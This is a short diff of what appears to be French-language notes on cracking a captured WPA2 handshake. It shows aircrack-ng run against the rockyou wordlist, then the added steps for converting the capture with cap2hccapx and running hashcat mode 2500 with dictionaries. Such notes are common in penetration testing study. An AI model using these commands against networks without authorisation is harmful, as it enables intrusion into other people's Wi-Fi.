@@ -40,8 +40,13 @@ xx:xx:xx:xx:xx:xx = mac de la borne cible
 aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt....
 
 # Bonus possible d'utiliser hashcat mais l'extension cap2hccapx est nécessaire:
+
 present dans le paquet hashcatutils
+
 conversion du fichier cap en hccapx pour hashcat
+
 cap2hccapx info.cap WPA2_capture.hccapx
+
 puis execute hashcat en spécifiant le "mask" de chiffrement et enregistrement dans un fichier dans l'exemple WPA2_resolved
+
 hashcat -m 2500 -a 6 -O -o WPA2_resolved.txt WPA2_capture.hccapx D:\Dictionnaires\ALL\dico_1.txt D:\Dictionnaires\ALL\dico_2.txt
